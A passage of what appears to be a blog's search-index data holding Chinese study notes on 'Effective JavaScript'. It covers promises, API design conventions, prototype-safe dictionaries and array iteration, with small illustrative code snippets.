若回调函数抛出一个异常, 它将会在每轮的事件循环中, 也就是开始下载时而不是期望的一个分离的回合抛出该异常. 为了确保总是异步调用回调函数, 可以使用已经存在的异步API, 使用通用的setTimeout在事件队列中增加一个回调函数.12345678910111213var cache = new Dict();function downloadCachingAsync(url, onsuccess, onerror)&#123; if(cache.has(url))&#123; var cached = cache.get(url); setTimeout( onsuccess.bind(null, cached), 0); // 使用bind将结果保存为onsuccess回调函数的第一个参数 return; &#125; return downloadAsynce(url, function(file)&#123; cache.set(url, file); onsuccess(file); &#125;, onerror);&#125; 即使可以立即得到数据,也绝不要同步地调用异步回调函数 同步地调用异步的回调函数扰乱了预期的操作序列, 并可能导致意向不到的交错代码 同步调用异步的回调函数可能导致栈溢出或错误的处理异常 使用异步的API, 比如setTimeout函数来调度异步回调函数,使其运行于另一个回合 68. 使用Promise模式清洁异步逻辑目前非常流行的构建异步API的方法为promise模式. 基于promise的API不接受回调函数作为参数, 相反, 它返回一个promise对象, 该对象通过其自身的then方法接收回调函数.1234567891011// 普通回调模式downloadAsync('file.txt', function(file)&#123; console.log('file: '+file);&#125;)// promise模式var p = downLoadP('file.txt');p.then(function(file)&#123; console.log('file: '+file);&#125;) 上述两种方式的简单对比看不出有什么大的不同, 但promise的改进在于它们的组合性. 传递给then方法的回调函数不仅执行, 也可以传递返回结果. 通过回调函数返回一个值, 可以构造一个新的promise.123456789var fileP = downloadP('file.txt');var lengthP = fileP.then(function(file)&#123; return file.length;&#125;);lengthP.then(function(length)&#123; console.log('length: '+length);&#125;); 可以将promise的方法理解为表示最终值的对象. 它封装了一个还未完成的并发操作, 但最终会产生一个结果值. then方法可以接收一个代表某种类型的最终值的promise对象, 并产生一个新的promise对象来代表另一种类型的最终值, 而不管回调函数返回了什么. 从现有的promise中构建新的promise的能力带来了很大的灵活性,且简单强大. 比如,构造一个程序用于拼接多个promise的结果12345678// 通过join函数能构建promise对象var filesP = join( downloadP('file1.txt'), downloadP('file2.txt'), downloadP('file3.txt') );filesP.then(function(files)&#123; console.log('file1: '+files[0]); console.log('file2: '+files[1]); console.log('file3: '+files[2]);&#125;); promise还有一个when方法, 用法与then类似.123456789var file1P = downloadP('file1.txt'), file2P = downloadP('file2.txt'), file3P = downloadP('file3.txt') );when([file1P, file2P, file3P],function(files)&#123; console.log('file1: '+files[0]); console.log('file2: '+files[1]); console.log('file3: '+files[2]);&#125;); promise通过then方法的返回值来联系结果, 或通过join函数能构建promise对象, 而不是在并行的回调函数间共享数据结构. 这本质上是安全的, 因为它避免了数据竞争. 同时promise风格也是有序的, 但比笨重的嵌套模式清晰的多, 错误处理也会通过promise自动传播, 可以为整个序列提供一个error回调函数, 而不是将error回调传递给每一步. 数据竞争在某些情况下是有用的,promise也提供了这种应用场景. 比如当需要从多个不同服务器下载同一份文件, 选择最先完成的那份. select(或choose)函数接收几个promise并返回最先完成的那个文件的promise(即几个promise彼此竞争).1234567var fileP = select( downloadP('http://example1.com/file.txt'), downloadP('http://example2.com/file.txt'), downloadP('http://example3.com/file.txt') );fileP.then(function(file)&#123; console.log('file: '+file);&#125; select的另一个用法是当超时的时候能终止操作.1234567var fileP = select(downloadP('http://example1.com/file.txt'), timeoutError(2000));fileP.then(function(file)&#123; console.log('file: '+file);&#125;, function(error)&#123; console.log('I/O error or timeout: '+ error);&#125;); promise代表最终值, 即并行操作完成时最终产生的结果 使用promise组合不同的并行操作 使用promise模式的API避免数据竞争 在要求有意的竞争条件时使用select(也被称为choose)","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"effective-javascript笔记-6","slug":"effective-javascript6","date":"2017-03-06T14:30:04.000Z","updated":"2017-03-25T16:00:00.000Z","comments":true,"path":"2017/03/06/effective-javascript6/","link":"","permalink":"https://github.com/xmoyKING/2017/03/06/effective-javascript6/","excerpt":"","text":"库和API设计开发可重用的程序和组件即可认为是在设计程序库, 设计良好的API能让人清楚,间接和明确的表达自己的程序. 53. 保持一致的约定对API的使用者来说, 命名和函数签名是最能产生影响的. 其中一个关键的约定是参数的顺序. 比如宽高, 确保参数总是以相同的顺序出现, 选择与其他库匹配的顺序是值得的, 因为几乎所有的库接收的顺序都是宽度第一,然后是高度. 又如CSS描述矩形的四条边的参数总是从top开始顺时针给出(top, right, bottom, left). 若API使用选项对象, 则可以避免参数对顺序的依赖, 同时对于标准选项和方法名, 应该选一个命名约定并坚持它. 每一个优秀的库都需要详尽的文档, 而一个极优秀的库会将其文档作为辅助. 一旦用户习惯了库中的约定, 则可以在做一些常见的任务而不需要每次查看文档. 一致的约定甚至能帮助用户推测哪些属性或方法是可用的而不需要去查看它们, 或者可以在控制台发现它们进而根据命名推测他们的行为. 在变量命名和函数签名中使用一致的约定 不要偏离用户在他们的开发平台中很可能遇到的约定 54. 将undefined看做”没有值”undefined值很特殊, 每当JS无法提供具体的值时,就产生undefined. 比如未赋值的变量初始值就是undefined.12var x; x; // undefined 访问对象中不存在的属性也会产生undefined12var obj = &#123;&#125;;obj.x; // undefined 一个函数体结尾使用未带参数的return语句,或未使用return语句都会产生返回值undefined12345678function f()&#123; return;&#125;funtion g()&#123;&#125;f(); // undefinedg(); // undefined 未给函数参数提供实参则该函数参数值为undefined1234function f(x)&#123; return x;&#125;f(); // undefined 在以上这些情况中, undefined值表示操作结果并不是一个特定的值, 但是每一个操作都需要产出点什么, 所以可以认为JS使用undefined来填补这个空白. 将undefined看做缺少某个特定的值是JS语言建立的一种公约, 将它用在其他目的会造成歧义.12345678910111213141516// 高亮函数的示例element.highlight(); // 使用默认颜色element.highlight('yellow'); // 使用传入的颜色// 若想提供一个方式来设置随机颜色, 可能会用undefined作为特殊的值element.highlight(undefined); // 使用一个随机颜色// 但会使得从其他来源获取参数时更容易出错var config = JSON.parse(preferences);element.highlight(config.highlightColor); // 此时可能传入undefined 导致了随机颜色// 更好的方式是显示使用一个特殊颜色名表示随机element.highlight('random');// 最好的方式的使用一个对象描述这种情况element.highlight(&#123;random: true&#125;); 另一个提防undefined的地方是可选参数的实现. 理论上arguments对象可检测是否传入了一个参数, 但实际上, 测试是否为undefined能使程序更健壮.12var s1 = new Server(80, 'example.com');var s2 = new Server(80); // 默认使用localhost 通过判断arguments.length来实现Server构造函数1234567function Server(port, hostname)&#123; if(arguments.length &lt; 2)&#123; hostname = 'localhost'; &#125; hostname = String(hostname); ...&#125; 更为合理的替代方案是测试hostname是否为真1234function Server(port, hostname)&#123; hostname = String(hostname || 'localhost'); ...&#125; 但是这种真值测试并不总是安全的, 因为一些可以接收0或者一些特殊的字符的函数有时会这种测试误伤. 更好的方式是显示测试是否全等于(===)undefined12345678910// 如下的函数就接收0,0参数, 但是若使用简单的真值坚持, 则无法传入0,0参数.function Element(width, height)&#123; this.width = width === undefined ? 320 : width; this.height = height === undefined ? 240 : height; ...&#125;var c1 = new Element(0, 0);c1.width; // 0c1.height: // 0 避免使用undefined表示任何非特定值 使用描述性的字符串或命名布尔属性的对象, 而不要使用undefined或null来代表特定的应用标志 提供参数默认值应当采用测试undefined的方式,而不是检查arguments.length 在允许0, NaN或空字符串为有效参数的地方, 绝不要通过真值测试来实现参数默认值 55. 接收关键字参数的选项对象一个函数最初是很简单,但是随着库功能的扩展, 函数的参数变得越来越多, 这通常被叫做参数蔓延(argument creep). 选项对象(object option)在应对较大规模的函数签名时很有用. 一个选项参数就是通过对其命名属性来提供额外参数数据的参数. 每个参数都是自我描述的, 不需要注释来解释参数的作用, 因为其属性名清楚的解释了. 这对布尔值类型参数极其有用. 选项对象的另一个好处是所有的参数都是可选的. 习惯上, 选项对象仅包含可选参数, 因此省略吊整个对象甚至都是可能的.1var alert = new Alert(); // 全为默认 若有一个或两个必须参数, 最好使其独立选项对象. 同时,实现一个接收选项对象的函数需要做更多的检查.12345function Alert(parent, message, opts)&#123; opts = opts || &#123;&#125;; this.width = opts.width === undefined ? 320 : opts.width; ...&#125; 许多JS库和框架都提供extend函数. 该函数接收target对象和source对象, 并将后者属性复制到前者中. 借助extend函数, 抽象出合并默认值和用户提供的选项对象值的逻辑, 使Alter函数变得简洁.123456789101112131415function Alert(parent, message, opts)&#123; opts = extend(&#123; width: 320, height: 240 &#125;); opts = exted(&#123; x: (parent.width / 2) - (opts.width / 2), y: (parent.height / 2) - (opts.height / 2), ... &#125;, opts); this.width = opts.width; this.height = opts.height; ...&#125; 为了避免不断重复检查每个参数是否存在的逻辑, 调用了两次extend函数, 因为x和y的默认值依赖于早期计算出的width和height值. 若将整个options复制到this对象, 那么还可以进一步简化它.123456789101112function Alert(parent, message, opts)&#123; opts = extend(&#123; width: 320, height: 240 &#125;); opts = exted(&#123; x: (parent.width / 2) - (opts.width / 2), y: (parent.height / 2) - (opts.height / 2), ... &#125;, opts); extend(this, opts);&#125; 不同框架提供了不同的extend函数的实现, 典型的实现是枚举源对象的属性, 并当这些属性不是undefined时将其复制到目标对象中.123456789101112function extend(target, source)&#123; if(source)&#123; for(var key in source)&#123; var val = source[key]; if(typeof val !== 'undefined')&#123; target[key] = val; &#125; &#125; &#125; return target;&#125; 使用选项对象使得API更具有可读性,更容易记忆 所有通过选项对象提供的参数应当被视为可选的 使用extend函数抽象出从选项对象中提取值的逻辑 56. 避免不必要的状态API可以被归为两类:有状态和无状态. 无状态的API提供的函数或方法的行为只取决于输入, 而与程序的状态改变无关. 比如, 字符串的方法是无状态的, 字符串的内容不能被修改, 方法只取决于字符串的内容及传递给方法的参数. 表达式&quot;foo&quot;.toUpperCase();总是产生&quot;FOO&quot;. 相反,Date对象的方法却是有状态的. 对相同的Date对象调用toString()方法会产生不同的结果, 这取决于Date的各种set方法是否已经将Date的属性改变. 虽然状态有时是必需的, 无状态的API状态往往更容易学习和使用, 更自我描述, 且不易出错. 比如Web的Canvas库就是有状态的API. 它提供绘制形状和图片到其画布的方法.12// 用fillText绘制文本到画布c.fillText(\"hello, world.\", 75, 25); fillText方法提供了绘制字符串在画布中位置的参数, 但并没有指定文本的其他属性, 如颜色, 透明度, 文本样式. 这些其他属性通过改变画布的内部状态来单独指定.1234c.fillStyle = \"blue\";c.font = \"24pt serif\";c.textAligh = \"center\";... 若想要改变这种有状态的API为无状态,则fillText的无状态版本可能如下:123456c.fillText(\"hello, world.\", 75, 25, &#123; fillStyle : \"blue\", font : \"24pt serif\", textAligh : \"center\", ...&#125;); 这种无状态的API更好, 有状态的API需要修改画布的内部状态, 这可能导致绘制操作之间相互影响, 即使他们之间没什么关联. 无状态的API可以自动重用默认值, 而有状态的API的某些默认值可能会被其他操作所修改, 这时必须显示指定默认值. 无状态的API更可读, 更简洁. 有状态的API更难学习, 尽可能地使用无状态的API 如果API是有状态的,标示出每个操作与哪些状态有关联 57. 使用结构类型设计灵活的接口一个假象的创建Wiki的库, wiki库必须能提取元数据, 如页面标题,作者信息, 并将页面内容格式化呈现给wiki读者. 提供一个自定义格式化器的方法.1234567891011121314151617// 使用如下var app = new Wiki(Wiki.formats.MEDIAWIKI);// 类实现将格式化函数存储在wiki实例对象的内部function Wiki(format)&#123; this.format = format; ...&#125;// 当读者查看页面时, 程序会检索出源文件并使用内部的格式化器将源文本渲染为HTML页面Wiki.prototype.displayPage = function(source)&#123; var page = this.format(source); var title = page.getTitle(); var author = page.getAuthor(); var output = page.toHTML(); ...&#125; 57 未完成, 不太懂 使用结构类型(也称为鸭子类型)来设计灵活的对象接口 结构接口更灵活, 轻量, 所以应该避免使用继承 针对单元测试, 使用mock对象即接口的替代实现来提供可复验的行为 58. 区分数组对象和类数组对象设有两个不同类的API, 第一个是位向量: 有序的位集合.123456789var bits = new BitVector();// enable方法被重载了, 可以传入一个索引或索引的数组bits.enable(4);bits.enable([1,3,8,17]);bits.bitAt(4); // 1bits.bitAt(8); // 1bits.bitAt(9); // 0 第二个类API是字符串集合:无序的字符串集合.123456789var set = new StringSet();set.add('Hamlet');set.add(['Roos', 'Guild']);set.add(&#123;Oph:1, Pol:1, Hor:1&#125;);set.contains('Pol'); // trueset.contains('Guild'); // trueset.contains('Fals'); // false 为了实现BitVector.prototype.enable方法, 可以通过测试其他情况来避免如何判断一个对象是否为数组的问题.123456789BitVector.prototype.enable = function(x)&#123; if(typeof x === 'number')&#123; this.enableBit(x); &#125;else&#123; // 推测x为一个类数组对象 for(var i = 0, n = x.length; i &lt; n; ++i)&#123; this.enableBit(x[i]); &#125; &#125;&#125; 而StringSet.prototype.add方法需要区分数组和对象. 数组其实是对象的一种. 我们需要区分数组和非数组. 使用instanceof操作符来测试一个对象继承自Array.prototype12345678910111213StringSet.prototype.add = function(x)&#123; if(typeof x === 'string')&#123; this.addString(x); &#125;else if(x instanceof Array)&#123; x.forEach(functon(s)&#123; this.addString(s); &#125;, this); &#125;else&#123; for(var key in x)&#123; this.addString(key); &#125; &#125;&#125; 但上述方法在跨frame通信时会有问题, 一个frame中的数组不会继承自另一个frame的Array.prototype. 出于这个原因, ES5引入了Array.isArray函数, 可以用来测试一个值是否为数组, 而不管原型继承.12345678910111213StringSet.prototype.add = function(x)&#123; if(typeof x === 'string')&#123; this.addString(x); &#125;else if(Array.isArray(x))&#123; // 使用ES5中的isArray方法 x.forEach(functon(s)&#123; this.addString(s); &#125;, this); &#125;else&#123; for(var key in x)&#123; this.addString(key); &#125; &#125;&#125; 若不支持ES5, 可以使用标准的Object.prototype.toString方法测试一个对象是否为数组.1234var toString = Object.prototype.toString;function isArray(x)&#123; return toString.call(x) === '[object Array]';&#125; 若传入的是一个类数组对象,则使用add的正确方法是,将这个对象转换为真正的数组.123MyClass.prototype.update = function()&#123; this.keys.add([].slice.call(arguments));&#125; 绝不重载与其他类型有重叠的结构类型 当重载一个结构类型与其他类型时, 先测试其他类型 当重载其他对象类型时, 接收真数组而不是类数组对象 文档标注你的API是否接收真数组或类数组值 使用ES5提供的Array.isArray方法测试真数组 59. 避免过度的强制转换JS是弱类型语言, 许多标准的操作符和代码库会自动地将非预期的输入参数强制转换为预期的类型而不是抛出异常.1234function square(x)&#123; return x*x;&#125;square('3'); // 9 强制转换是方便的, 但当强制转换与重载的函数一起工作时结果令人困惑. 一般地, 在那些使用参数类型来决定重载函数行为的函数中避免强制转换参数是明智的. 59不完全 避免强制转换和重载的混用 考虑防御性的监视非预期的输入 60. 支持方法链无状态的API的部分能力是将复杂操作分解为更小的操作的灵活行. 比如replace方法.12345function escapeBasicHTML(str)&#123; return str.replace(/&amp;/g, \"&amp;amp;\") .replace(/&lt;/g, \"&amp;lt;\") .replace(/&gt;/g, \"&amp;gt;\")&#125; 如果一个API产生了一个接口对象, 调用这个接口对象的方法产生的对象如果具有相同的接口, 那么就可以使用方法链. 下面的链式操作接收代表用户记录的对象的数组,提取每个记录中的username属性,过滤掉所有的空用户名, 最后将用户名转换为小写字符串.123456789var users = records.map(function(record)&#123; return record.username;&#125;).filter(function(username)&#123; return !!username;&#125;).map(function(username)&#123; return username.toLowerCase();&#125;); 这种链式风格非常灵活, 使用起来很方便. 通常的情况下,无状态的API中, 若API不修改对象,而是返回一个新对象, 则链式调用会很自然. 有状态的API的设置中,链式也是很有用的. 技巧就是方法在更新对象时返回this, 而不是默认的undefined, 这使得通过一个链式方法调用的序列来对同一个对象执行多次更新成为可能.12345678element.setBackgroundColor('yellow') .setColor('red') .setFontWeight('bold');// 又比如jQuery$('#notify').html('server not respond') .removeClass('info') .addClass('error'); 使用方法链来连接无状态的操作 通过在无状态的方法中返回新对象来支持方法链 通过在有状态的方法中返回this来支持方法链","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"effective-javascript笔记-5","slug":"effective-javascript5","date":"2017-03-03T08:45:45.000Z","updated":"2017-03-24T16:00:00.000Z","comments":true,"path":"2017/03/03/effective-javascript5/","link":"","permalink":"https://github.com/xmoyKING/2017/03/03/effective-javascript5/","excerpt":"","text":"数组和字典将对象作为集合的用法 43. 使用Object的直接实例构造轻量级字典JS对象的一个核心是一个字符串属性名称与属性值的映射表. 可以通过for in循环枚举对象属性名.12345678var dict = &#123;alice: 34, bob: 24, chris: 62&#125;;var people = [];for(var name in dict)&#123; people.push(name+': '+ dict[name]);&#125;people; // [\"alice: 34\", \"bob: 24\", \"chris: 62\"] 但for in循环除了枚举自身的属性外,还会枚举继承过来的属性.123456789101112131415161718192021function NaiveDict()&#123;&#125;NaiveDict.prototype.count = function()&#123; var i = 0; for(var name in this)&#123; ++i; &#125; return i;&#125;;NaiveDict.prototype.toString = function()&#123; return \"[object NaiveDict]\";&#125;var dict = new NaiveDict();dict.alice = 34;dict.bob = 24;dict.chris = 62;dict.count(); // 5, 算上了count和toString 类似的错误比如使用数组表示字典, 当有别的库扩展了数组的原型的时候, 也会出现上述问题. 这被称为原型污染 当使用直接的对象字面量时, 只会受到Object.prototype的影响.123456789var dict = &#123;&#125;;dict.alice = 34;dict.bobo = 24;var names = [];for(var name in dict)&#123; names.push(name);&#125;names; // [\"alice\", \"bob\"] 使用对象字面量构造轻量级字典 轻量级字典应该是Object.prototype的直接子类, 这样for in循环时能避免原型污染 44. 使用null原型防止原型污染防止原型污染最简单的方式之一就是一开始就不使用原型. 但ES5之前, 没有标准的方式创建一个空原型的新对象.1234567function C()&#123;&#125;C.prototype = null;// 但实例化该构造函数仍然得到Object的实例var o = new C();Object.getPrototypeOf(o) === null; // falseObject.getPrototypeOf(o) === Object.prototype; // true ES5提供了标准的方法来创建一个没有原型的对象, Object.create函数能使用一个用户指定的原型链和一个属性表示符动态的构造对象.属性描述符描述了新对象属性的值及特性.123456var x = Object.create(null);Object.getPrototypeOf(o) === null; // true // PS: 在chrome下为false// 若环境不支持Object.create, 则可以使用__proto__属性var x = &#123;__proto__: null&#125;;x instanceof Object; // false 在ES5中, 使用Object.create(null)创建自由原型的空对象是不太容易被污染的 在一些老环境中, 考虑使用{__proto__: null} __proto__既不标准,也不是完全可移植的, 可能在未来被移除 绝不要使用__proto__作为字典中的key, 一些环境下将其作为特殊的属性 45. 使用hasOwnProperty方法以避免原型污染即使是一个空对象字面量,也继承了Object.prototype的大量属性. 因为JS的对象操作总是以继承的方式工作.123456789var dict = &#123;&#125;;\"alice\" in dict; // false\"toString\" in dict; // true\"vauleOf\" in dict; // true // PS: chrome下为false//可以使用hasOwnProperty方法, 它能避免原型污染dict.hasOwnProperty(\"alice\"); // falsedict.hasOwnProperty(\"toString\"); // falsedict.hasOwnProperty(\"valueOf\"); // false 为了避免字典中存储了一个同为”hasOwnProperty”名称的属性. 可以采用call方法, 而不用本身的hasOwnProperty方法123456var hasOwn = Object.prototype.hasOwnProperty;// 或var hasOwn = &#123;&#125;.hasOwnProperty;// 调用时用call绑定任意对象, 这样不管接收者的hasOwnProperty方法是否被覆盖,该方法都能正常工作hasOwn.call(dict,\"alice\"); 最后, 将这种方法抽象到Dict类的构造函数中, 避免每次都使用call显示绑定实例对象123456789101112131415161718192021222324252627282930313233function Dict(elements)&#123; this.elements = elements || &#123;&#125;; // 这样允许传入一个可选的elements参数&#125;Dict.prototype.has = function(key)&#123; return &#123;&#125;.hasOwnProperty.call(this.elements, key);&#125;;Dict.prototype.get = function(key)&#123; // 只返回自身的属性 return this.has(key) ? this.elements[key] : undefined;&#125;;Dict.prototype.set = function(key, val)&#123; this.elements[key] = val;&#125;;Dict.prototype.remove = function(key)&#123; delete this.elements[key];&#125;;// 使用如下var dict = new Dict(&#123; alice: 34, bob: 24, chris: 62&#125;);dict.has('alice'); // truedict.get('bob'); // 24dict.has('valueOf'); // false 但上述Dict类没有考虑到__proto__属性的问题, 所以还不是最完美的. 为了达到最大的可移植性和安全性. 需要为每一个Dict类的方法都添加对__proto__属性的检查.123456789101112131415161718192021222324252627282930313233343536373839404142434445function Dict(elements)&#123; this.elements = elements || &#123;&#125;; // 这样允许传入一个可选的elements参数 this.hasSpecialProto = false; // 标识是否存在__proto__属性 this.specialProto = undefined; // __proto__属性的引用&#125;Dict.prototype.has = function(key)&#123; if(key === \"__proto__\")&#123; return this.hasSpecialProto; &#125; return &#123;&#125;.hasOwnProperty.call(this.elements, key);&#125;;Dict.prototype.get = function(key)&#123; if(key === \"__proto__\")&#123; return this.specialProto; &#125; // 只返回自身的属性 return this.has(key) ? this.elements[key] : undefined;&#125;;Dict.prototype.set = function(key, val)&#123; if(key === \"__proto__\")&#123; this.hasSpecialProto = true; this.specialProto = val; &#125;else&#123; this.elements[key] = val; &#125;&#125;;Dict.prototype.remove = function(key)&#123; if(key === \"__proto__\")&#123; this.hasSpecialProto = false; this.specialProto = undefined; &#125;else&#123; delete this.elements[key]; &#125;&#125;;// 使用如下var dict = new Dict();dict.has('__proto__'); // false 使用hasOwnProperty方法避免原型污染 使用词法作用域和call方法避免覆盖hasOwnProperty方法 考虑在封装hasOwnProperty的类中实现字典操作 使用字典类避免将__proto__作为key使用 46. 使用数组而不是使用字典来存储有序集合因为使用for in循环来枚举对象属性应该与顺序无关,而ES标准也没有对枚举对象属性的顺序做出定义. 所以一定确保枚举对象属性的时候, 操作的行为和顺序无关. 47. 绝不要在Object.prototype中增加可枚举的属性通过以上的一些例子,我们了解到,在Object.prototype中添加的方法或者属性能被子类用for in循环枚举出来.12345678Object.prototype.allKeys = function()&#123; var result = []; for(var key in this)&#123; result.push(key); &#125; return result;&#125;;(&#123;a:1, b:2, c:3&#125;).allKeys(); // [\"a\",\"b\",\"c\",\"allKeys\"] 解决的方法是,使用一个命名函数,而不是在原型对象上添加共享的方法.1234567function allKeys(obj)&#123; var result = []; for(var key in obj)&#123; result.push(key); &#125; return result;&#125; ES5提供了一种友好的在Object.prototype中添加属性的机制.使用defineProperty方法. 可以定义一个对象的属性并指定该属性的元数据.123456789101112Object.defineProperty(Object.prototype, \"allkeys\", &#123; value: function()&#123; var result = []; for(var key in this)&#123; result.push(key); &#125; return result; &#125;, writable: true, enumerable: false, configurable: true&#125;); 避免在Object.prototype中添加属性 考虑编写一个函数代替Object.prototype方法 若确定要在Object.prototype中添加属性, 用ES5的defineProperty方法将他们定义为不可枚举的属性 48. 避免在枚举期间修改对象一个例子说明问题, 社交网络有一组成员, 每一个成员有一个存储其朋友信息的列表.1234567891011121314151617function Member(name)&#123; this.name = name; this.friends = [];&#125;var a = new Member('alice'), b = new Member('bob'), c = new Member('carol'), d = new Member('dieter'), e = new Member('eli'), f = new Member('fatima');a.friends.push(b);b.friends.push(c);c.friends.push(e);d.friends.push(b);e.friends.push(d, f); 搜索一个社交网络需要遍历该社交网络, 通过workset实现. 原理为, 以单个根节点开始, 添加发现的节点, 移除访问过的节点. 下面的用for in循环实现该方法.12345678910111213141516171819202122232425262728Member.prototype.inNetwork = function(other)&#123; var visited = &#123;&#125;; var workset = &#123;&#125;; workset[this.name] = this; for(var name in workset)&#123; var member = workset[name]; delete workset[name]; if(name in visited)&#123; // 无法找到 continue; &#125; visited[name] = member; if(member === other)&#123; return true; &#125; member.friends.forEach(function(friend)&#123; workset[friend.name] = friend; &#125;); &#125; return false;&#125;;// 问题是, 这段代码无法正常运行, 有buga.inNetwork(f); // false 问题根源为ES规定: 若被枚举对象在枚举期间添加了新的属性, 那么枚举期间并不能保障新添加的属性能够被访问.即 若我们修改了被枚举对象, 则不能确保for in循环的行为是预期的了. 尝试自己控制循环而不使用内置的forEach，同时使用自己的字典抽象以避免原型污染，实现方式为将字典放置在WorkSet类中来追踪当前集合中的元素数量12345678910111213141516171819202122232425262728function WorkSet()&#123; this.entries = new Dict(); this.count = 0;&#125;WorkSet.prototype.isEmpty = function()&#123; return this.count === 0;&#125;WorkSet.prototype.add = function(key, val)&#123; if(this.entries.has(key))&#123; return; &#125; this.entries.set(set, key); this.count++;&#125;WorkSet.prototype.get = function(key)&#123; return this.entries.get(key);&#125;WorkSet.prototype.remove = function(key)&#123; if(!this.entries.has(key))&#123; return; &#125; this.entries.remove(key); this.count--;&#125; 为了提取集合中的某个元素，需要给Dict类添加一个新的方法123456789101112Dict.prototype.pick = function()&#123; for(var key in this.elements)&#123; if(this.has(key))&#123; return key; &#125; &#125; throw new Error(\"empty dictionary\");&#125;WorkSet.prototype.pick = function()&#123; return this.entries.pick();&#125; 现在可以使用while循环类实现inNetwork方法，每次选择任意元素并从工作集中删除。123456789101112131415161718192021Member.prototype.inNetwork = function(other)&#123; var visited = &#123;&#125;; var workset = new WorkSet(); workset.add(this.name, this); while(!workset.isEmpty())&#123; var name = workset.pick(); var member = workset.get(name); workset.remove(name); if(name in visited)&#123; continue; &#125; visited[name] = member; if(member === other)&#123; return true; &#125; member.friends.forEach(function(friend)&#123; workset.add(friend.name, friend); &#125;); &#125; return false;&#125;; pick方法是不确定的，因为for in循环的枚举顺序的不确定，所以可以考虑确定的工作集算法，将工作集改为列表，存储在数组中，inNetwork方法总是用相同的顺序遍历图12345678910111213141516171819Member.prototype.inNetwork = function(other)&#123; var visited = &#123;&#125;; var worklist = [this]; while(worklist.length &gt; 0)&#123; var member = worklist.pop(); if(member.name in visited)&#123; continue; &#125; visited[member.name] = member; if(member === other)&#123; return true; &#125; member.friends.forEach(function(friend)&#123; worklist.push(friend); &#125;); &#125; return false;&#125;; 当使用for in循环枚举一个对象的属性时，要确保不修改该对象 当迭代一个对象时，若该对象的内容可能会在循环期间被改变，应该使用while循环或for循环代替for in循环 为了在不断变化的数据结构中能够预测枚举，考虑使用一个有序的数据结构，如数组，而不是使用字典对象 49. 数组迭代优先选择for循环,而不是for in循环下面这段代码mean的输出值为多少?1234567var scores = [98, 74, 85, 77, 93, 100, 89];var total = 0;for(var score in scores)&#123; total += score;&#125;var mean = total / scores.length;mean; // ? 答案并不是88(正常的逻辑下), 也不是21(for in循环枚举的是key, 这里的key为 0, 1, 2, 3, 4, 5, 6). 而是17636.571428571428, 因为字符串的+=操作,total变量最后的值为&quot;00123456&quot;, 而这里是将一个字符串按照8进制转化为十进制之后,再除以7得到的17636.571428571428经chrome测试，结果为NaN，total变量最后的值为&quot;00123456remove&quot; 正确的方法(得到88的方法)为使用for循环.1234567var scores = [98, 74, 85, 77, 93, 100, 89];var total = 0;for(var i = 0, n = scores.length; i &lt; n; ++i)&#123; total += scores[i];&#125;var mean = total / scores.length;mean; // 88 注意变量n的使用, 若循环体不修改数组, 则每次迭代中, 循环都会简单的重新计算数组的长度.1for(var i = 0; i &lt; score.length; ++i)&#123;...&#125; 同时, 在循环一开始就计算数组的长度还有几个好处: 即使是优化的JS编译器,可能有时也很难保证避免重新计算scores.length是安全的. 能给阅读代码的人一个信息, 循环的终止条件是简单且确定的. 迭代数组的索引属性应当总是使用for循环而不是for in循环 考虑在循环之前将数组的长度存储在一个局部变量中以避免重新计算数组长度 50. 迭代方法优于循环编程中容易在确定循环终止条件时引入的一些简单错误.1234567for(var i = 0; i &lt;= n; ++i)&#123;...&#125; // 例外的结尾循环for(var i = 1; i &lt; n; ++i)&#123;...&#125; // 跳过了第一次循环for(var i = n; i &gt;= 0; --i)&#123;...&#125; // 例外的初始循环for(var i = n-1; i &gt; 0; --i)&#123;...&#125; // 跳过了最后一次循环 ES5中,可以使用一些便利的方法,比如forEach, 能消除终止条件和任何数组索引.具体看: 你还在用for循环大法麽？ 上面的都是ES5中的默认方法, 我们完全可以定义自己的迭代抽象方法, 一般将这些方法称为谓词, 重复地对数组的每个元素应用回调的谓词. 比如提取满足谓词(下面细说什么叫谓词)的数组的前几个元素.1234567891011121314function takeWhile(a, pred)&#123; var result = []; for(var i = 0, n = a.length; i &lt; n; ++i)&#123; if(!pred(a[i], i))&#123; break; &#125; result[i] = a[i]; &#125; return result;&#125;var prefix = takeWhile([1, 2, 4, 8, 16, 32], function(n)&#123; return n &lt; 10;&#125;); // [1, 2, 4, 8] takeWhile方法将数组所以i赋给了pred, 我们可以选择使用或者忽略该参数. 在标准库中所以的迭代方法, 都将数组的所以传递给用户自定义的函数. 循环只有一点优于迭代函数, 那就是前者有控制流程操作, 如break和continue. 而后者,只有some和every方法可以提前终止循环, 而forEach是无法自动提前结束的. some和every是短路循环(short-circuiting), 若对some方法回调一旦产生真值,则直接返回, 不会执行其余元素. every是产生假值则立即返回. 这种行为可以在这些方法在实现forEach提前终止循环的变种时使用.1234567891011function takeWhile(a, pred)&#123; var result = []; a.every(function(x, i)&#123; if(!pred(x))&#123; return false; // break &#125; result[i] = x; return true; // continue &#125;); return result;&#125; 使用迭代方法(如Array.prototype.forEach 和 Array.prototype.map) 替换for循环使得代码更可读, 并且避免了重复循环控制逻辑 使用自定义的迭代函数来抽象未被标准库支持的常见循环模式 在需要提前终止循环的情况下, 仍然推荐使用传统的循环, some和every方法可以用于提前退出 51. 在类数组对象上复用通用的数组方法Array.prototype中的标准方法被设计为其他对象可复用的方法, 即使这些对象并没有继承Array. 比如函数的arguments对象.12345function highlight()&#123; [].forEach.call(arguments, function(widget)&#123; widget.setBackground('yellow'); &#125;);&#125; forEach方法是一个Function对象, 它继承了Function.prototype中的call方法. 与arguments对象一样, DOM中的NodeList类是web页面中的节点, 使用document.getElementsByTagName操作会返回一个NodeList作为结果. 关键为怎么使一个对象”看起来像数组”? 数组对象的基本构成有两个简单的规则: 具有一个范围在0到2^32 - 1的整数length属性. length属性大于该对象的最大索引, 所以是一个范围在0到2^32 - 2的整数, 它的字符串表示的是该对象的一个key. 